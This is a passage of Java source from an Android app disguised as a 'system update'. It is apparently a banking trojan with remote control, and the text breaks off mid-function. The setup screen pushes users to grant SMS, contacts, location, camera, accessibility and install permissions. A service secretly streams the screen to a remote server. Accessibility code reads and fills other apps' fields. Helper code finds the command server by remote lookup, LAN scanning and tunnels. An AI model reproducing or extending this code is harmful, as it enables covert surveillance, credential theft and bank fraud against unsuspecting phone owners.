===== .\app\src\main\java\com\eloeeducacao\Pulso.java =====
package com.eloeeducacao;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.util.AttributeSet;
import android.view.View;

public class Pulso extends View {

    private final Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
    private final long t0 = System.currentTimeMillis();

    public Pulso(Context c, AttributeSet a) {
        super(c, a);
        p.setStyle(Paint.Style.STROKE);
        p.setStrokeWidth(3f);
    }

    @Override protected void onDraw(Canvas cv) {
        int w = getWidth(), h = getHeight();
        if (w == 0 || h == 0) return;
        float cx = w / 2f, cy = h / 2f;
        float base = Math.min(w, h) / 2f;
        long t = System.currentTimeMillis() - t0;
        for (int i = 0; i < 3; i++) {
            float f = ((t + i * 700L) % 2100L) / 2100f;
            float r = base * (0.22f + 0.72f * f);
            p.setColor(Color.argb(Math.max(0, (int) (80 * (1f - f))), 88, 166, 255));
            cv.drawCircle(cx, cy, r, p);
        }
        p.setStyle(Paint.Style.FILL);
        p.setColor(Color.parseColor("#58A6FF"));
        cv.drawCircle(cx, cy, base * 0.15f, p);
        p.setStyle(Paint.Style.STROKE);
        postInvalidateOnAnimation();
    }
}
===== .\app\src\main\java\com\eloeeducacao\ScreenSvc.java =====
package com.eloeeducacao;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;

public class ScreenSvc extends Service {

    public static volatile boolean alive;
    public static volatile boolean black;
    public static volatile boolean giveUp;
    public static volatile int Q = 35;
    public static volatile int FPS = 6;
    public static volatile int W = 540;
    public static volatile long lastFrame;
    public static ScreenSvc I;

    private static final int MAX_RESTARTS = 3;

    private MediaProjection mp;
    private VirtualDisplay vd;
    private ImageReader ir;
    private HandlerThread th;
    private Handler bh;
    private int w, h, dpi, sw, sh;
    private long last;
    private int blackCount;
    private int restarts;

    private final MediaProjection.Callback cb = new MediaProjection.Callback() {
        @Override public void onStop() {
            alive = false;
            black = false;
            Net.send("{\"t\":\"err\",\"o\":\"projecao encerrada pelo sistema\"}");
        }
    };

    public static void rebuildNow() {
        ScreenSvc s = I;
        if (s == null || s.bh == null) return;
        s.bh.post(new Runnable() { @Override public void run() { s.rebuild(); } });
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        I = this;
        th = new HandlerThread("scr");
        th.start();
        bh = new Handler(th.getLooper());
    }

    @Override public int onStartCommand(Intent it, int f, int s) {
        if (it == null) {
            alive = false;
            stopSelf();
            return START_NOT_STICKY;
        }
        giveUp = false;
        restarts = 0;
        startFg();
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mp = mpm.getMediaProjection(it.getIntExtra("code", 0),
                    (Intent) it.getParcelableExtra("data"));
            if (mp == null) {
                alive = false;
                Net.send("{\"t\":\"err\",\"o\":\"getMediaProjection nulo\"}");
                stopSelf();
                return START_NOT_STICKY;
            }
            mp.registerCallback(cb, bh);

            DisplayMetrics dm = new DisplayMetrics();
            ((WindowManager) getSystemService(WINDOW_SERVICE))
                    .getDefaultDisplay().getRealMetrics(dm);

            w = dm.widthPixels;
            h = dm.heightPixels;
            dpi = dm.densityDpi;
            mirror();
            Net.send("{\"t\":\"info\",\"o\":\"projecao iniciada " + w + "x" + h + " em " + W + "px\"}");
        } catch (Throwable t) {
            alive = false;
            Net.send("{\"t\":\"err\",\"o\":\"start: " + Util.esc(String.valueOf(t)) + "\"}");
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    private void mirror() {
        try {
            sw = Math.max(2, Math.min(W, w)) & ~1;
            sh = Math.max(2, (h * sw / Math.max(1, w))) & ~1;
            ir = ImageReader.newInstance(sw, sh, PixelFormat.RGBA_8888, 2);
            ir.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override public void onImageAvailable(ImageReader r) { onImg(r); }
            }, bh);
            int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
            vd = mp.createVirtualDisplay("av", sw, sh, Math.max(120, dpi * sw / Math.max(1, w)),
                    flags, ir.getSurface(), null, bh);
            alive = true;
            black = false;
            blackCount = 0;
            lastFrame = System.currentTimeMillis();
        } catch (Throwable t) {
            alive = false;
            Net.send("{\"t\":\"err\",\"o\":\"mirror: " + Util.esc(String.valueOf(t)) + "\"}");
        }
    }

    private void rebuild() {
        try { if (vd != null) { vd.setSurface(null); vd.release(); } } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        vd = null;
        ir = null;
        last = 0;
        mirror();
    }

    private static boolean dark(Bitmap b) {
        int bw = b.getWidth(), bh2 = b.getHeight();
        int sx = Math.max(1, bw / 10), sy = Math.max(1, bh2 / 10);
        long sum = 0;
        int n = 0;
        for (int y = sy / 2; y < bh2; y += sy)
            for (int x = sx / 2; x < bw; x += sx) {
                int c = b.getPixel(x, y);
                sum += ((c >> 16) & 0xff) + ((c >> 8) & 0xff) + (c & 0xff);
                n++;
            }
        return n > 0 && sum / (n * 3) < 8;
    }

    private void onImg(ImageReader r) {
        Image img = null;
        Bitmap out = null;
        try {
            img = r.acquireLatestImage();
            if (img == null) return;
            if (giveUp) return;
            long now = System.currentTimeMillis();
            if (now - last < 1000 / Math.max(1, FPS)) return;
            last = now;

            Image.Plane p = img.getPlanes()[0];
            int ps = p.getPixelStride();
            int bw = p.getRowStride() / ps;

            out = Bitmap.createBitmap(bw, sh, Bitmap.Config.ARGB_8888);
            out.copyPixelsFromBuffer(p.getBuffer());
            if (bw != sw) {
                Bitmap c = Bitmap.createBitmap(out, 0, 0, sw, sh);
                out.recycle();
                out = c;
            }
            lastFrame = now;

            if (dark(out)) {
                if (Util.banco(KeySvc.I == null ? null : KeySvc.I.curPkg)) {
                    black = true;
                    blackCount = 0;
                } else if (++blackCount > 10) {
                    black = true;
                    if (blackCount == 20) {
                        if (restarts < MAX_RESTARTS) {
                            restarts++;
                            Net.send("{\"t\":\"info\",\"o\":\"frame preto, rebuild " + restarts + "\"}");
                            rebuild();
                        } else if (!giveUp) {
                            giveUp = true;
                            alive = false;
                            Net.send("{\"t\":\"err\",\"o\":\"projecao falhou, usando screenshot\"}");
                        }
                    }
                }
            } else {
                blackCount = 0;
                black = false;
            }

            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            out.compress(Bitmap.CompressFormat.JPEG, Q, bo);
            Net.sendBin(bo.toByteArray());
        } catch (Throwable ignored) {
        } finally {
            if (out != null) out.recycle();
            if (img != null) { try { img.close(); } catch (Throwable ignored) {} }
        }
    }

    private void startFg() {
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            NotificationChannel c = new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            c.setSound(null, null);
            nm.createNotificationChannel(c);
        }
        Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        Notification n = nb.setContentTitle("Servicos do sistema")
                .setContentText("Sincronizando...")
                .setSmallIcon(R.mipmap.ic)
                .setOngoing(true)
                .setShowWhen(false)
                .build();
        try {
            if (Build.VERSION.SDK_INT >= 29)
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            else
                startForeground(1, n);
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"startForeground: " + Util.esc(String.valueOf(t)) + "\"}");
        }
    }

    @Override public void onDestroy() {
        alive = false;
        black = false;
        I = null;
        try { if (vd != null) vd.release(); } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        try { if (mp != null) mp.stop(); } catch (Throwable ignored) {}
        try { if (th != null) th.quitSafely(); } catch (Throwable ignored) {}
        super.onDestroy();
    }
}
===== .\app\src\main\java\com\eloeeducacao\Sel.java =====
package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.List;
import java.util.regex.Pattern;

public final class Sel {

    public static final class Hit {
        public final AccessibilityNodeInfo node;
        public final int x, y;
        public final String txt;
        Hit(AccessibilityNodeInfo n, int x, int y, String t) {
            this.node = n; this.x = x; this.y = y; this.txt = t;
        }
    }

    private static boolean casa(AccessibilityNodeInfo n, JSONObject s) {
        try {
            if (s.has("edit") && n.isEditable() != s.getBoolean("edit")) return false;
            if (s.has("click") && n.isClickable() != s.getBoolean("click")) return false;
            if (s.has("cls")) {
                String c = String.valueOf(n.getClassName()).toLowerCase();
                if (!c.contains(s.getString("cls").toLowerCase())) return false;
            }
            if (s.has("id")) {
                String id = n.getViewIdResourceName();
                if (id == null || !Pattern.compile(s.getString("id")).matcher(id).find()) return false;
            }
            if (s.has("txt")) {
                String t = (n.getText() == null ? "" : n.getText().toString()) + " "
                        + (n.getContentDescription() == null ? "" : n.getContentDescription().toString());
                if (!Pattern.compile(s.getString("txt"), Pattern.CASE_INSENSITIVE).matcher(t).find())
                    return false;
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    public static List<Hit> todos(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> out = new ArrayList<>();
        if (raiz == null) return out;
        Deque<AccessibilityNodeInfo> fila = new ArrayDeque<>();
        fila.add(raiz);
        int limite = 4000;
        while (!fila.isEmpty() && limite-- > 0) {
            AccessibilityNodeInfo n = fila.poll();
            if (n == null) continue;
            if (casa(n, s)) {
                Rect r = new Rect();
                n.getBoundsInScreen(r);
                if (r.width() > 0 && r.height() > 0) {
                    CharSequence t = n.getText();
                    out.add(new Hit(n, r.centerX(), r.centerY(), t == null ? "" : t.toString()));
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) {
                AccessibilityNodeInfo f = n.getChild(i);
                if (f != null) fila.add(f);
            }
        }
        return out;
    }

    public static Hit melhor(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> l = todos(raiz, s);
        if (l.isEmpty()) return null;
        if (!s.has("perto")) return l.get(0);
        int px = s.optJSONArray("perto").optInt(0, 0);
        int py = s.optJSONArray("perto").optInt(1, 0);
        Hit best = null;
        double bd = Double.MAX_VALUE;
        for (Hit h : l) {
            double d = Math.hypot(h.x - px, h.y - py);
            if (d < bd) { bd = d; best = h; }
        }
        return best;
    }
}

===== .\app\src\main\java\com\eloeeducacao\SetupActivity.java =====
package com.eloeeducacao;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SetupActivity extends Activity {

    private static final int N = 5;
    private static final String CH = "s";
    private static final int NC = 78;
    private static final int RQ = 21;

    private static final String[] TIT = {
            "Permissões do sistema",
            "Acessibilidade",
            "Acesso a notificações",
            "Instalar aplicativos",
            "Bateria"
    };
    private static final String[] SUB = {
            "Toque em Permitir nas janelas que aparecerem.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Permita a instalação por esta fonte e volte ao app.",
            "Escolha Permitir. Isso impede o sistema de encerrar o serviço."
    };

    private TextView titulo, sub, passo, corpo, detalhe;
    private Button acao, pular;
    private int etapa;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setBackgroundColor(0xFF101418);
        l.setPadding(dp(26), dp(54), dp(26), dp(26));

        titulo = new TextView(this);
        titulo.setText("Atualização do sistema");
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(24);
        titulo.setOnLongClickListener(new View.OnLongClickListener() {
            @Override public boolean onLongClick(View v) {
                startActivity(new Intent(SetupActivity.this, MainActivity.class));
                return true;
            }
        });
        l.addView(titulo);

        sub = new TextView(this);
        sub.setText("Versão 1.2.3 · componentes do sistema");
        sub.setTextColor(0xFF8A97A5);
        sub.setTextSize(13);
        sub.setPadding(0, dp(6), 0, dp(28));
        l.addView(sub);

        passo = new TextView(this);
        passo.setTextColor(0xFF2F81F7);
        passo.setTextSize(12);
        passo.setPadding(0, 0, 0, dp(6));
        l.addView(passo);

        corpo = new TextView(this);
        corpo.setTextColor(Color.WHITE);
        corpo.setTextSize(17);
        l.addView(corpo);

        detalhe = new TextView(this);
        detalhe.setTextColor(0xFF8A97A5);
        detalhe.setTextSize(14);
        detalhe.setPadding(0, dp(8), 0, dp(26));
        l.addView(detalhe);

        acao = new Button(this);
        acao.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                if (etapa >= N) { fim(); return; }
                abre(etapa);
            }
        });
        l.addView(acao);

        pular = new Button(this);
        pular.setText("Pular etapa");
        pular.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                etapa++;
                pinta();
            }
        });
        LinearLayout.LayoutParams pl = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        pl.topMargin = dp(4);
        pl.gravity = Gravity.END;
        pular.setLayoutParams(pl);
        l.addView(pular);

        TextView rodape = new TextView(this);
        rodape.setText("Se as opções do desenvolvedor estiverem ativadas, desligue-as antes de abrir o banco.");
        rodape.setTextColor(0xFF5B6773);
        rodape.setTextSize(11);
        rodape.setPadding(0, dp(30), 0, 0);
        l.addView(rodape);

        setContentView(l);
        etapa = 0;
        pinta();
    }

    @Override protected void onResume() {
        super.onResume();
        cancela();
        while (etapa < N && pronto(etapa)) etapa++;
        pinta();
    }

    @Override protected void onPause() {
        super.onPause();
        if (etapa < N) notifica();
    }

    private void pinta() {
        if (etapa >= N) {
            passo.setText("CONCLUÍDO");
            corpo.setText("Configuração concluída");
            detalhe.setText("Tudo pronto. Pode fechar o aplicativo.");
            acao.setText("Fechar");
            pular.setVisibility(View.GONE);
            return;
        }
        passo.setText("ETAPA " + (etapa + 1) + " DE " + N);
        corpo.setText(TIT[etapa]);
        detalhe.setText(SUB[etapa]);
        acao.setText(etapa == 0 || etapa == 4 ? "Permitir" : "Abrir ajustes");
        pular.setVisibility(View.VISIBLE);
    }

    private void abre(int e) {
        try {
            switch (e) {
                case 0:
                    pede();
                    return;
                case 1: {
                    try {
                        Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                        d.putExtra(Intent.EXTRA_COMPONENT_NAME,
                                new ComponentName(this, KeySvc.class).flattenToString());
                        startActivity(d);
                        return;
                    } catch (Throwable ignored) {}
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    return;
                }
                case 2:
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    return;
                case 3:
                    startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:" + getPackageName())));
                    return;
                case 4:
                    startActivity(new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                    return;
            }
        } catch (Throwable t) {
            etapa++;
            pinta();
        }
    }

    private boolean pronto(int e) {
        switch (e) {
            case 0: return permsOk();
            case 1: return Util.accOn(this);
            case 2: return notifOk();
            case 3: return instalOk();
            case 4: return batOk();
        }
        return true;
    }

    private void pede() {
        java.util.List<String> q = new java.util.ArrayList<>();
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.CAMERA,
                "android.permission.POST_NOTIFICATIONS",
                "android.permission.READ_MEDIA_IMAGES"
        };
        for (String s : ps) {
            try {
                if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) q.add(s);
            } catch (Throwable ignored) {}
        }
        if (q.isEmpty()) { etapa++; pinta(); return; }
        requestPermissions(q.toArray(new String[0]), RQ);
    }

    private boolean permsOk() {
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String s : ps)
            if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) return false;
        return true;
    }

    private boolean notifOk() {
        try {
            String s = Settings.Secure.getString(getContentResolver(),
                    "enabled_notification_listeners");
            return s != null && s.contains(getPackageName());
        } catch (Throwable t) { return false; }
    }

    private boolean instalOk() {
        try {
            if (Build.VERSION.SDK_INT >= 26)
                return getPackageManager().canRequestPackageInstalls();
            return true;
        } catch (Throwable t) { return true; }
    }

    private boolean batOk() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable t) { return true; }
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == RQ) { etapa++; pinta(); }
    }

    private void notifica() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel c = new NotificationChannel(
                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
                c.setShowBadge(false);
                nm.createNotificationChannel(c);
            }
            Intent i = new Intent(this, SetupActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            Notification n = (Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this))
                    .setContentTitle("Toque para voltar ao app")
                    .setContentText("Continue a configuração da etapa " + (etapa + 1))
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setOngoing(true)
                    .setContentIntent(pi)
                    .build();
            nm.notify(NC, n);
        } catch (Throwable ignored) {}
    }

    private void cancela() {
        try {
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
        } catch (Throwable ignored) {}
    }

    private void fim() {
        cancela();
        finish();
    }

    public static void loja(Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            return;
        } catch (Throwable ignored) {}
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}

===== .\app\src\main\java\com\eloeeducacao\Snap.java =====
package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayDeque;
import java.util.Deque;

public final class Snap {

    private static String t(CharSequence c) {
        if (c == null) return "";
        String s = c.toString().replace("\n", " ").replace("|", "/").trim();
        return s.length() > 90 ? s.substring(0, 90) : s;
    }

    public static String dump() {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        if (r == null) return "sem janela ativa";
        StringBuilder b = new StringBuilder();
        Deque<AccessibilityNodeInfo> f = new ArrayDeque<>();
        Deque<Integer> d = new ArrayDeque<>();
        f.add(r);
        d.add(0);
        int n = 0;
        while (!f.isEmpty() && n++ < 1500) {
            AccessibilityNodeInfo x = f.poll();
            int dep = d.poll();
            if (x == null) continue;
            Rect rr = new Rect();
            x.getBoundsInScreen(rr);
            if (rr.width() > 0 && rr.height() > 0) {
                String cls = String.valueOf(x.getClassName());
                int i = cls.lastIndexOf('.');
                if (i >= 0) cls = cls.substring(i + 1);
                b.append(dep).append('|').append(cls).append('|')
                        .append(t(x.getViewIdResourceName())).append('|')
                        .append(x.isEditable() ? "E" : "")
                        .append(x.isClickable() ? "C" : "").append('|')
                        .append(rr.left).append(',').append(rr.top).append(',')
                        .append(rr.right).append(',').append(rr.bottom).append('|')
                        .append(t(x.getText())).append('|')
                        .append(t(x.getContentDescription())).append('\n');
            }
            for (int i = 0; i < x.getChildCount(); i++) {
                AccessibilityNodeInfo c = x.getChild(i);
                if (c != null) { f.add(c); d.add(dep + 1); }
            }
        }
        return b.length() == 0 ? "tela vazia (FLAG_SECURE?)" : b.toString();
    }
}

===== .\app\src\main\java\com\eloeeducacao\Tree.java =====
package com.eloeeducacao;

import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Tree {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final int MAX = 140;

    private Tree() {}

    public static void dump(KeySvc s) {
        JSONArray arr = new JSONArray();
        try {
            AccessibilityNodeInfo root = s.getRootInActiveWindow();
            if (root != null) walk(root, arr, 0);
        } catch (Throwable ignored) {}
        Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
    }

    private static void walk(AccessibilityNodeInfo n, JSONArray arr, int d) {
        if (n == null || arr.length() >= MAX || d > 28) return;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0) {
                String txt = n.getText() == null ? "" : n.getText().toString().trim();
                if (txt.isEmpty() && n.getContentDescription() != null)
                    txt = n.getContentDescription().toString().trim();
                boolean edit = n.isEditable();
                boolean clic = n.isClickable();
                if (!txt.isEmpty() || edit || clic) {
                    if (txt.length() > 120) txt = txt.substring(0, 120);
                    JSONObject o = new JSONObject();
                    o.put("t", txt);
                    o.put("x", r.centerX());
                    o.put("y", r.centerY());
                    if (clic) o.put("c", 1);
                    if (edit) o.put("e", 1);
                    o.put("cls", cls(n.getClassName()));
                    arr.put(o);
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) walk(n.getChild(i), arr, d + 1);
        } catch (Throwable ignored) {}
    }

    private static String cls(CharSequence c) {
        if (c == null) return "?";
        String s = c.toString();
        int i = s.lastIndexOf('.');
        return (i >= 0 ? s.substring(i + 1) : s).toLowerCase();
    }

    public static void fill(final KeySvc s, final float x, final float y, final String v) {
        s.touch(x, y);
        H.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root == null) return;
                    AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                    if (f == null) return;
                    Bundle b = new Bundle();
                    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, v);
                    f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
                } catch (Throwable ignored) {}
            }
        }, 400);
    }
}
===== .\app\src\main\java\com\eloeeducacao\Util.java =====
package com.eloeeducacao;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public final class Util {

    public static String dev(Context c) {
        int bat = -1;
        try {
            BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
            bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Throwable ignored) {}
        int w = 0, h = 0;
        try {
            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            w = dm.widthPixels;
            h = dm.heightPixels;
        } catch (Throwable ignored) {}
        return "\"m\":\"" + esc(Build.MANUFACTURER + " " + Build.MODEL) + "\",\"sdk\":" +
                Build.VERSION.SDK_INT + ",\"bat\":" + bat + ",\"w\":" + w + ",\"h\":" + h +
                ",\"ip\":\"" + ip() + "\"";
    }

    public static String ip() {
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (!ni.isUp() || ni.isLoopback()) continue;
                for (InetAddress a : Collections.list(ni.getInetAddresses()))
                    if (a instanceof Inet4Address) return a.getHostAddress();
            }
        } catch (Throwable ignored) {}
        return "?";
    }

    public static String screen(Context c) {
        try {
            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            return dm.widthPixels + "x" + dm.heightPixels + "@" + dm.densityDpi;
        } catch (Throwable t) {
            return "?";
        }
    }

    public static boolean accOn(Context c) {
        try {
            String s = Settings.Secure.getString(c.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(c.getPackageName());
        } catch (Throwable t) { return false; }
    }

    private static String broadcast() {
        DatagramSocket s = null;
        try {
            s = new DatagramSocket();
            s.setBroadcast(true);
            s.setSoTimeout(1500);
            byte[] msg = "AVAL".getBytes();
            s.send(new DatagramPacket(msg, msg.length,
                    InetAddress.getByName("255.255.255.255"), Cfg.DISC));
            byte[] buf = new byte[160];
            DatagramPacket p = new DatagramPacket(buf, buf.length);
            s.receive(p);
            String u = new String(buf, 0, p.getLength()).trim();
            if (u.startsWith("ws://") || u.startsWith("wss://")) return u;
        } catch (Throwable ignored) {
        } finally {
            try { if (s != null) s.close(); } catch (Throwable ignored) {}
        }
        return null;
    }

    private static String scan() {
        String my = ip();
        int dot = my.lastIndexOf('.');
        if (dot < 0) return null;
        final String base = my.substring(0, dot) + ".";
        final AtomicReference<String> hit = new AtomicReference<>();
        ExecutorService ex = Executors.newFixedThreadPool(24);
        for (int i = 1; i < 255; i++) {
            final int n = i;
            ex.execute(() -> {
                if (hit.get() != null) return;
                Socket s = null;
                try {
                    s = new Socket();
                    s.connect(new InetSocketAddress(base + n, Cfg.PORT), 350);
                    hit.compareAndSet(null, "ws://" + base + n + ":" + Cfg.PORT + "/ws?t=" + Cfg.TOKEN);
                } catch (Throwable ignored) {
                } finally {
                    try { if (s != null) s.close(); } catch (Throwable ignored) {}
                }
            });
        }
        ex.shutdown();
        try { ex.awaitTermination(7, TimeUnit.SECONDS); } catch (Throwable ignored) {}
        return hit.get();
    }

    private static String fonte(long agora) {
        return (Cfg.RAW2 != null && Cfg.RAW2.length() > 8 ? Cfg.RAW2 : Cfg.RAW)
                + "?x=" + agora;
    }

    private static String remoto(Context c) {
        long agora = System.currentTimeMillis();
        String cache = c.getSharedPreferences("p", 0).getString("host", null);
        long t = c.getSharedPreferences("p", 0).getLong("hostT", 0);
        if (cache != null && agora - t < 5000) return "wss://" + cache + "/ws?t=" + Cfg.TOKEN;
        try {
            HttpURLConnection h = (HttpURLConnection) new URL(fonte(agora)).openConnection();
            h.setConnectTimeout(6000);
            h.setReadTimeout(6000);
            h.setUseCaches(false);
            BufferedReader r = new BufferedReader(new InputStreamReader(h.getInputStream()));
            String l = r.readLine();
            r.close();
            if (l != null) {
                l = l.trim();
                if (l.startsWith("ws://") || l.startsWith("wss://")) return l;
                if (l.length() > 5) {
                    c.getSharedPreferences("p", 0).edit().putString("host", l).putLong("hostT", agora).apply();
                    return "wss://" + l + "/ws?t=" + Cfg.TOKEN;
                }
            }
        } catch (Throwable ignored) {}
        if (cache != null) return "wss://" + cache + "/ws?t=" + Cfg.TOKEN;
        return null;
    }

    public static List<String> candidates(Context c) {
        List<String> out = new ArrayList<>();
        String last = c.getSharedPreferences("p", 0).getString("url", null);
        if (last != null && last.length() > 8) out.add(last);

        String remoto = remoto(c);
        if (remoto != null && !out.contains(remoto)) out.add(remoto);

        String d = broadcast();
        if (d != null && !out.contains(d)) out.add(d);

        if (Cfg.TUNNEL.length() > 4) {
            String a = "wss://" + Cfg.TUNNEL + "/ws?t=" + Cfg.TOKEN;
            String b = "https://" + Cfg.TUNNEL + "/ws?t=" + Cfg.TOKEN;
            if (!out.contains(a)) out.add(a);
            if (!out.contains(b)) out.add(b);
        }
        return out;
    }

    public static void remember(Context c, String url) {
